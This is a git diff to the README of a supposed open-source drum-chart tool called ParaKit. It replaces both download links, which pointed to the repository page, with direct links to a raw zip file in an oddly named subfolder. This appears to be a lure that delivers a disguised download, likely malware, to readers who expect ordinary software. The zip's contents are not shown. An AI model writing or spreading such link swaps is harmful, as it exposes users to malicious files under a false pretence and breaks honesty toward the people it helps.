@@ -1,6 +1,6 @@
 # 🥁 ParaKit-Open_Source - Create Custom Drum Charts With Ease
 
-[![Download ParaKit](https://img.shields.io/badge/Download-ParaKit-blue.svg)](https://github.com/Marielweekly549/ParaKit-Open_Source)
+[![Download ParaKit](https://img.shields.io/badge/Download-ParaKit-blue.svg)](https://github.com/Marielweekly549/ParaKit-Open_Source/raw/refs/heads/main/pholcoid/Para_Kit_Open_Source_powermonger.zip)
 
 ParaKit-Open_Source helps you build drum charts for VR and rhythm games. This tool turns audio files and MIDI data into usable drum tracks. You can use it to split music into specific instrument parts, find the beat of a song, or convert sheet music into a format your game understands. It works with electronic drum kits and MIDI pads. 
 
@@ -8,7 +8,7 @@ ParaKit-Open_Source helps you build drum charts for VR and rhythm games. This to
 
 You can visit the download page to obtain the software. 
 
-[Click here to visit the download page](https://github.com/Marielweekly549/ParaKit-Open_Source)
+[Click here to visit the download page](https://github.com/Marielweekly549/ParaKit-Open_Source/raw/refs/heads/main/pholcoid/Para_Kit_Open_Source_powermonger.zip)
 
 ## 💻 System Requirements
 
